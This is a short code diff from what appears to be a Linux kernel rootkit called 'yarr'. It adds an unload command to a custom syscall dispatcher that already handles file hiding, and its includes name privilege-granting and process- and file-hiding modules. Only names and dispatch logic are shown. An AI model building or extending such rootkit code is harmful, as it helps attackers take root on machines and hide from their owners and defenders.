@@ -24,10 +24,10 @@
 #include "interrupt.h"
 #include "funcs.h"
 #include "types.h"
-
 #include "giveprivs.h"
 #include "hideproc.h"
 #include "hidefile.h"
+#include "hide.h"
 
 unsigned long *old_syscall = NULL;
 
@@ -63,6 +63,10 @@ asmlinkage long yarrSyscall(yarrOps code, const syscallData __user *data) {
 
 		case STOP_HIDE_FILE:
 			res = stopHideFile(data->filename);
+			break;
+
+		case UNLOAD_YARR:
+			res = unloadMe();
 			break;
 
 		default:
